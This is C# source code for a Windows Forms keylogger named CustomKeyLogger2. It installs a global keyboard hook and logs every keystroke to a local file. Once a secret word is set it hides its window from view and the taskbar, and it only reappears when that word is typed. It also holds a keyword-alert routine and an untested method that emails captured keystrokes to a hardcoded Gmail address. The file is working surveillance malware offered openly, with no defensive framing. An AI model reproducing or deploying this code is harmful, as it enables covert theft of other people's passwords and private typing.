﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

using System.Runtime.InteropServices;
using System.IO;
using System.Collections;
using System.Net.Mail;

namespace CustomKeyLogger2
{
    public partial class Form1 : Form
    {
        string atmdir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase);
        string writeUp = "";
        string secretWord = "";
        ArrayList keyWords;

        string secretFileDir;
        string keywordsFileDir;
        string logsFileDir;

        public Form1()
        {
            InitializeComponent();
            
            InitStream();

            InitSecretWord();

            InitKeyWords();

            writeUp = "";
        }

        private void InitStream()
        {
            atmdir = atmdir.Remove(0, 6);
            atmdir += "\\";

            secretFileDir = atmdir + "secret.krs";
            keywordsFileDir = atmdir + "keywords.krs";
            logsFileDir = atmdir + "logs.krs";
            StreamWriter sw;
            if (!File.Exists(secretFileDir))
            {
                sw = File.CreateText(secretFileDir);
                sw.Close();
            }
            if (!File.Exists(keywordsFileDir))
            {
                sw = File.CreateText(keywordsFileDir);
                sw.Close();
            }
            if (!File.Exists(logsFileDir))
            {
                sw = File.CreateText(logsFileDir);
                sw.Close();
            }
        }

        private void InitSecretWord()
        {
            using(StreamReader tr = new StreamReader(secretFileDir))
            {
                secretWord = tr.ReadLine();
                if(secretWord == null) secretWord = "";
            }

            if (secretWord.CompareTo("") == 0)
            {
                this.ShowWindow();
                this.btnStart.Enabled = true;
                this.btnStop.Enabled = false;
                this.btnHide.Enabled = false;
            }
            else
            {
                hook.CreateHook(KeyReaderr);
                this.btnStart.Enabled = false;
                this.btnStop.Enabled = true;
                this.btnHide.Enabled = true;
                this.HideWindow();
            }
        }

        private void InitKeyWords()
        {
            using (StreamReader sr = new StreamReader(keywordsFileDir))
            {
                String temp;
                keyWords = new ArrayList();

                do
                {
                    // read a line of text
                    temp = sr.ReadLine();
                    if (temp != null) keyWords.Add(temp);
                } while (temp != null);
            }
        }        

        private void btnStart_Click(object sender, EventArgs e)
        {
            hook.CreateHook(KeyReaderr);
            btnStart.Enabled = false;
            btnStop.Enabled = true;
            btnHide.Enabled = true;
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            hook.DestroyHook();
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            btnHide.Enabled = false;
        }

        public void KeyReaderr(IntPtr wParam, IntPtr lParam)
        {
            int key = Marshal.ReadInt32(lParam);

            hook.VK vk = (hook.VK)key;

            String temp = "";

            switch (vk)
            {
                //case hook.VK.VK_F1: temp = "<-F1->";
                //    break;
                //case hook.VK.VK_F2: temp = "<-F2->";
                //    break;
                //case hook.VK.VK_F3: temp = "<-F3->";
                //    break;
                //case hook.VK.VK_F4: temp = "<-F4->";
                //    break;
                //case hook.VK.VK_F5: temp = "<-F5->";
                //    break;
                //case hook.VK.VK_F6: temp = "<-F6->";
                //    break;
                //case hook.VK.VK_F7: temp = "<-F7->";
                //    break;
                //case hook.VK.VK_F8: temp = "<-F8->";
                //    break;
                //case hook.VK.VK_F9: temp = "<-F9->";
                //    break;
                //case hook.VK.VK_F10: temp = "<-F10->";
                //    break;
                //case hook.VK.VK_F11: temp = "<-F11->";
                //    break;
                //case hook.VK.VK_F12: temp = "<-F12->";
                //    break;

                //case hook.VK.VK_SNAPSHOT: temp = "<-print screen->";
                //    break;
                //case hook.VK.VK_SCROLL: temp = "<-scroll>";
                //    break;
                //case hook.VK.VK_PAUSE: temp = "<-pause->";
                //    break;
                case hook.VK.VK_INSERT: temp = "\r\n<-insert->";
                    break;
                case hook.VK.VK_HOME: temp = "\r\n<-home->";
                    break;
                case hook.VK.VK_DELETE: temp = "\r\n<-delete->";
                    break;
                //case hook.VK.VK_END: temp = "<-end->";
                //    break;
                //case hook.VK.VK_PRIOR: temp = "<-page up->";
                //    break;
                //case hook.VK.VK_NEXT: temp = "<-page down->";
                //    break;
                                
                case hook.VK.VK_ESCAPE: temp = "\r\n<-esc->";
                    break;
                case hook.VK.VK_NUMLOCK: temp = "\r\n<-numlock->";
                    break;
                case hook.VK.VK_LSHIFT: temp = "\r\n<-left shift->";
                    break;
                case hook.VK.VK_RSHIFT: temp = "\r\n<-right shift->";
                    break;
                case hook.VK.VK_LCONTROL: temp = "\r\n<-left control->";
                    break;
                case hook.VK.VK_RCONTROL: temp = "\r\n<-right control->";
                    break;
                case hook.VK.VK_LMENU: temp = "\r\n<-left alt/menu->";
                    break;
                case hook.VK.VK_RMENU: temp = "\r\n<-right al/menu->";
                    break;
                case hook.VK.VK_TAB: temp = "\r\n<-tab->";
                    break;
                case hook.VK.VK_CAPITAL: temp = "\r\n<-caps lock->";
                    break;
                case hook.VK.VK_BACK: temp = "\r\n<-backspace->";
                    break;
                case hook.VK.VK_RETURN: temp = "\r\n<-enter->";
                    break;
                case hook.VK.VK_SPACE: temp = "\t";     //  "<-space->"
                    break;

                case hook.VK.VK_LEFT: temp = "\r\n<-arrow left->";
                    break;
                case hook.VK.VK_UP: temp = "\r\n<-arrow up->";
                    break;
                case hook.VK.VK_RIGHT: temp = "\r\n<-arrow right->";
                    break;
                case hook.VK.VK_DOWN: temp = "\r\n<-arrow down->";
                    break;

                case hook.VK.VK_MULTIPLY: temp = "*";
                    break;
                case hook.VK.VK_ADD: temp = "+";
                    break;
                case hook.VK.VK_SEPERATOR: temp = "|";
                    break;
                case hook.VK.VK_SUBTRACT: temp = "-";
                    break;
                case hook.VK.VK_DECIMAL: temp = ".";
                    break;
                case hook.VK.VK_DIVIDE: temp = "/";
                    break;

                case hook.VK.VK_OEM_1: temp = ";";
                    break;
                case hook.VK.VK_OEM_PLUS: temp = "=";
                    break;
                case hook.VK.VK_OEM_COMMA: temp = ",";
                    break;
                case hook.VK.VK_OEM_MINUS: temp = "-";
                    break;
                case hook.VK.VK_OEM_PERIOD: temp = ".";
                    break;
                case hook.VK.VK_OEM_2: temp = "/";
                    break;
                case hook.VK.VK_OEM_3: temp = "`";
                    break;

                case hook.VK.VK_NUMPAD0: temp = "0";
                    break;
                case hook.VK.VK_NUMPAD1: temp = "1";
                    break;
                case hook.VK.VK_NUMPAD2: temp = "2";
                    break;
                case hook.VK.VK_NUMPAD3: temp = "3";
                    break;
                case hook.VK.VK_NUMPAD4: temp = "4";
                    break;
                case hook.VK.VK_NUMPAD5: temp = "5";
                    break;
                case hook.VK.VK_NUMPAD6: temp = "6";
                    break;
                case hook.VK.VK_NUMPAD7: temp = "7";
                    break;
                case hook.VK.VK_NUMPAD8: temp = "8";
                    break;
                case hook.VK.VK_NUMPAD9: temp = "9";
                    break;

                case hook.VK.VK_Q: temp = "q";
                    break;
                case hook.VK.VK_W: temp = "w";
                    break;
                case hook.VK.VK_E: temp = "e";
                    break;
                case hook.VK.VK_R: temp = "r";
                    break;
                case hook.VK.VK_T: temp = "t";
                    break;
                case hook.VK.VK_Y: temp = "y";
                    break;
                case hook.VK.VK_U: temp = "u";
                    break;
                case hook.VK.VK_I: temp = "i";
                    break;
                case hook.VK.VK_O: temp = "o";
                    break;
                case hook.VK.VK_P: temp = "p";
                    break;
                case hook.VK.VK_A: temp = "a";
                    break;
                case hook.VK.VK_S: temp = "s";
                    break;
                case hook.VK.VK_D: temp = "d";
                    break;
                case hook.VK.VK_F: temp = "f";
                    break;
                case hook.VK.VK_G: temp = "g";
                    break;
                case hook.VK.VK_H: temp = "h";
                    break;
                case hook.VK.VK_J: temp = "j";
                    break;
                case hook.VK.VK_K: temp = "k";
                    break;
                case hook.VK.VK_L: temp = "l";
                    break;
                case hook.VK.VK_Z: temp = "z";
                    break;
                case hook.VK.VK_X: temp = "x";
                    break;
                case hook.VK.VK_C: temp = "c";
                    break;
                case hook.VK.VK_V: temp = "v";
                    break;
                case hook.VK.VK_B: temp = "b";
                    break;
                case hook.VK.VK_N: temp = "n";
                    break;
                case hook.VK.VK_M: temp = "m";
                    break;

                case hook.VK.VK_0: temp = "0";
                    break;
                case hook.VK.VK_1: temp = "1";
                    break;
                case hook.VK.VK_2: temp = "2";
                    break;
                case hook.VK.VK_3: temp = "3";
                    break;
                case hook.VK.VK_4: temp = "4";
                    break;
                case hook.VK.VK_5: temp = "5";
                    break;
                case hook.VK.VK_6: temp = "6";
                    break;
                case hook.VK.VK_7: temp = "7";
                    break;
                case hook.VK.VK_8: temp = "8";
                    break;
                case hook.VK.VK_9: temp = "9";
                    break;
                default: break;
            }

            writeUp = writeUp + temp;

            unhide();
#if Temp
            checkKeys();
#endif
            writeToFile(temp);
        }

        public void unhide()
        {
            if (writeUp.Contains(secretWord) && secretWord != "")
            {
                writeUp = writeUp.Replace(secretWord,"");
                this.ShowWindow();
            }
        }

        public void checkKeys()
        {
            int max = keyWords.Count;

            for (int i = 0; i < max; i++)
            {
                if (writeUp.Contains((String)keyWords[i]))
                {
                    MessageBox.Show("KeyWord!");
                    MessageBox.Show((String)keyWords[i]);

                    writeUp = writeUp.Replace((String)keyWords[i],"");
                    return;
                }
            }

        }

        public void writeToFile(String writing)
        {
            File.AppendAllText(logsFileDir, writing);
        }

        private void btnWrtTFl_Click(object sender, EventArgs e)
        {
            writeToFile(writeUp);
            writeUp = "";
        }

        private void btnShow_Click(object sender, EventArgs e)
        {
            txtLog.Text = File.ReadAllText(logsFileDir);
        }

        private void btnSvScrtWrd_Click(object sender, EventArgs e)
        {
            WriteSecretWord();
        }

        private void WriteSecretWord()
        {
            File.Delete(secretFileDir);
            using (StreamWriter sw = File.CreateText(secretFileDir))
            {
                sw.Write(txtScrtWrd.Text.Trim());
            }
            secretWord = txtScrtWrd.Text.Trim();
        }

        private void btnSaveKeyWord_Click(object sender, EventArgs e)
        {
            String input = txtKeyWord.Text.Trim();
            if (CheckDuplicateKeyWords(input)) return;

            keyWords.Add(input);
            using (StreamWriter sw = new StreamWriter(keywordsFileDir))
            {
                sw.WriteLine(input);
            }
        }

        private bool CheckDuplicateKeyWords(string input)
        {
            bool result = false;
            int max = keyWords.Count;
            for (int i = 0; i < max; i++)
            {
                if ((String)keyWords[i] == input) result = true;
            }
            return result;
        }

        public void sendMailK() // not tested
        {
            MailMessage message = new MailMessage("keylogger", "arxleol@gmail.com", "keyword fired", writeUp);
            SmtpClient emailClient = new SmtpClient("either local host or google smtp or soemthing third");
            System.Net.NetworkCredential SMTPUserInfo = new System.Net.NetworkCredential("your username", "your password");
            emailClient.UseDefaultCredentials = false;
            emailClient.Credentials = SMTPUserInfo;
            emailClient.Send(message);
        }

        private void btnHide_Click(object sender, EventArgs e)
        {
            this.HideWindow();
        }

        private void ShowWindow()
        {
            this.Opacity = 1;
            this.ShowInTaskbar = true;
            this.WindowState = FormWindowState.Normal;
            this.Refresh();
        }

        private void HideWindow()
        {
            this.Opacity = 0;
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;
            this.Refresh();
        }
    }
}